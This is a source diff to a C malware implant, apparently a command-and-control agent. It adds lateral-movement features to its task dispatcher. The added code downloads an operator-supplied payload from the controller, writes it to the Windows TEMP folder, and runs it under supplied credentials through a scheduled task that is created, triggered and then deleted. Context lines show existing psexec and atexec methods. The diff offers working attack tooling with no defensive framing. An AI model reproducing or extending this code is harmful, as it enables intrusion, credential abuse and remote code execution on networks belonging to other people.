@@ -2110,7 +2110,23 @@ void dispatch_task(AgentTask *task) {
         json_get_str(args,"host",lat_host,sizeof(lat_host),"");
         json_get_str(args,"user",lat_user,sizeof(lat_user),"");
         json_get_str(args,"pass",lat_pass,sizeof(lat_pass),"");
-        json_get_str(args,"cmd",lat_cmd,sizeof(lat_cmd),"whoami");
+        json_get_str(args,"cmd",lat_cmd,sizeof(lat_cmd),"");
+        char lat_payload[256]={0};
+        json_get_str(args,"payload",lat_payload,sizeof(lat_payload),"");
+        /* GUI sends payload= (filename) instead of cmd= in JUMP/privesc flows */
+        if (lat_payload[0] && !lat_cmd[0]) {
+            size_t pl_len=0;
+            uint8_t *pl_data=agent_download_file(lat_payload,&pl_len);
+            if (!pl_data||pl_len==0) {
+                free(pl_data);
+                agent_send_result(task->id,"","LATERAL: payload download failed"); return;
+            }
+            const char *tmp=getenv("TEMP"); if(!tmp)tmp="C:\\Windows\\Temp";
+            snprintf(lat_cmd,sizeof(lat_cmd),"%s\\%s",tmp,lat_payload);
+            FILE *pf=fopen(lat_cmd,"wb");
+            if(pf){fwrite(pl_data,1,pl_len,pf);fclose(pf);}
+            free(pl_data);
+        }
         if (!lat_host[0]) { agent_send_result(task->id,"","LATERAL: host required"); return; }
         char lat_buf[4096];
         if (_stricmp(lat_method,"atexec")==0) {
@@ -2183,6 +2199,28 @@ void dispatch_task(AgentTask *task) {
             snprintf(lat_buf,sizeof(lat_buf),"net use \\\\%s\\IPC$ /del /y 2>&1",lat_host);
             char *lr7=run_shell(lat_buf); free(lr7);
             agent_send_result(task->id,"[+] psexec: service started and cleaned","");
+        } else if (_stricmp(lat_method,"runas")==0) {
+            /* Run payload as local user via schtasks */
+            const char *ru=lat_user;
+            if(strncmp(lat_user,".\\",2)==0)ru=lat_user+2;
+            else if(strncmp(lat_user,"./",2)==0)ru=lat_user+2;
+            char ru_res[4096]={0};
+            snprintf(lat_buf,sizeof(lat_buf),
+                "schtasks /Create /SC ONCE /ST 00:00 /F /TN endgame_ru "
+                "/TR \"\\\"%s\\\"\" /RU \"%s\" /RP \"%s\" 2>&1",
+                lat_cmd,ru,lat_pass);
+            char *rr1=run_shell(lat_buf);
+            snprintf(ru_res,sizeof(ru_res),"[+] runas → %s @ %s\n    cmd: %s\n%s\n",
+                ru,lat_host,lat_cmd,rr1?rr1:"");
+            free(rr1);
+            char *rr2=run_shell("schtasks /Run /TN endgame_ru 2>&1");
+            strncat(ru_res,rr2?rr2:"",sizeof(ru_res)-strlen(ru_res)-1);
+            free(rr2);
+            Sleep(3000);
+            char *rr3=run_shell("schtasks /Delete /TN endgame_ru /F 2>&1");
+            strncat(ru_res,rr3?rr3:"",sizeof(ru_res)-strlen(ru_res)-1);
+            free(rr3);
+            agent_send_result(task->id,ru_res,"");
         } else {
             char e2[128]; snprintf(e2,sizeof(e2),"unknown lateral method: %s",lat_method);
             agent_send_result(task->id,"",e2);
